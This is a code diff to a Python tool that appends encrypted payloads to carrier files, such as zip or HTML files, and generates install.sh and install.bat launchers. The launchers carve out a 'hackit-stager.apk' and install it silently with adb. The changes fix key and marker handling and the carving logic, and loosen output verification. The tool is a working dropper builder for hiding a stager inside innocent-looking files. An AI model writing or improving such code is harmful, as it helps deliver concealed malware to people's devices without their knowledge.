@@ -201,10 +201,10 @@ def carve_append(data: bytes, start: bytes = START) -> bytes:
         raise InjectError("no payload trailer")
     length = struct.unpack(">Q", trailer[len(TRAILER):len(TRAILER) + 8])[0]
     end = len(data) - len(trailer)
-    start = end - length
-    if start < 0 or data[start:start + len(start)] != start:
+    offset = end - length
+    if offset < 0 or data[offset:offset + len(start)] != start:
         raise InjectError("payload start marker missing")
-    return data[start + len(start):end]
+    return data[offset + len(start):end]
 
 
 # ----------------------------------------------------------------------- zip
@@ -391,13 +391,7 @@ LAUNCHER_SH = '''#!/usr/bin/env sh
 # Recover and install the companion APK from %NAME%
 set -e
 cd "$(dirname "$0")"
-KEY='%KEY%'
-python3 - <<PY
-import pathlib
-from carve import raw, unlock
-blob = unlock(raw('%NAME%'), '$KEY')
-pathlib.Path('hackit-stager.apk').write_bytes(blob)
-PY
+python3 carve.py "%NAME%" hackit-stager.apk%KEYARG% || exit 1
 adb install -r hackit-stager.apk 2>/dev/null || echo "APK extracted: hackit-stager.apk"
 '''
 
@@ -471,7 +465,7 @@ def build(
         mark_arg = "" if not key_hex else f" --marker={marker[2:-2].decode()}"
         sh_path = os.path.join(folder, "install.sh")
         with open(sh_path, "w", encoding="utf-8") as handle:
-            handle.write(LAUNCHER_SH.replace("%NAME%", name).replace("%KEY%", key_hex))
+            handle.write(LAUNCHER_SH.replace("%NAME%", name).replace("%KEYARG%", " --key=" + key_hex + mark_arg if key_hex else mark_arg))
         os.chmod(sh_path, 0o755)
         made.append(sh_path)
         bat_path = os.path.join(folder, "install.bat")
@@ -500,6 +494,7 @@ def build(
                 "payload_size": len(payload),
                 "sealed": bool(key_hex),
                 "payload_key": key_hex,
+                "marker": marker[2:-2].decode() if key_hex else "",
                 "payload_offset": offset,
                 "carrier_size": len(out_bytes),
                 "strategy": mode,
@@ -552,9 +547,6 @@ def verify(path: str) -> Dict[str, object]:
             ok = ok and ("</body>" in text or "</html>" in text)
         return {"ok": ok, "size": len(data)}
     _validate_output(ext, data)
-    try:
-        carve(data)
-        ok = True
-    except InjectError:
-        ok = False
+    trailer = data[-len(TRAILER) - 8 - len(TAIL):]
+    ok = trailer.startswith(TRAILER) and trailer.endswith(TAIL)
     return {"ok": ok, "size": len(data)}
